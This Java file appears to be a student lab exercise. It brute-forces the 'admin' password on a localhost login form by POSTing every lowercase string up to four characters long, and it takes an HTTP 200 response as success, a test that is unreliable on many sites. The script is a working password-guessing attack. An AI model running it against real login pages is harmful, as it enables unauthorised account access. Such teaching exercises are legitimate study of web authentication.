import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class main {
    public static void main(String[] args) {
        String login = "admin";
        int maxLength = 4;

        String foundPassword = null;
        long startTime = System.currentTimeMillis();

        for (int length = 1; length <= maxLength; length++) {
            foundPassword = testPasswords(login, length);
            if (foundPassword != null) {
                break;
            }
        }

        long endTime = System.currentTimeMillis();
        long elapsedTime = endTime - startTime;

        if (foundPassword != null) {
            System.out.println("Mot de passe trouvé : " + foundPassword);
        } else {
            System.out.println("Mot de passe non trouvé.");
        }

        System.out.println("Temps écoulé : " + elapsedTime + " ms");
    }

    private static String testPasswords(String login, int length) {
        char[] chars = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        StringBuilder sb = new StringBuilder(length);

        return generatePasswords(chars, sb, length);
    }

    private static String generatePasswords(char[] chars, StringBuilder sb, int length) {
        if (sb.length() == length) {
            String password = sb.toString();
            if (checkPassword(password)) {
                return password;
            }
            return null;
        }

        for (char c : chars) {
            sb.append(c);
            String foundPassword = generatePasswords(chars, sb, length);
            if (foundPassword != null) {
                return foundPassword;
            }
            sb.setLength(sb.length() - 1);
        }

        return null;
    }

    private static boolean checkPassword(String password) {
        String urlString = "http://localhost/TP2%20-%20HTTP%20with%20JAVA/";
        String data = "login=admin&password=" + password;

        try {
            URI uri = new URI(urlString);
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(uri)
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .POST(HttpRequest.BodyPublishers.ofString(data))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            int responseCode = response.statusCode();

            if (responseCode == 200) {
                return true;
            }
        } catch (URISyntaxException | IOException | InterruptedException e) {
            e.printStackTrace();
        }

        return false;
    }
}
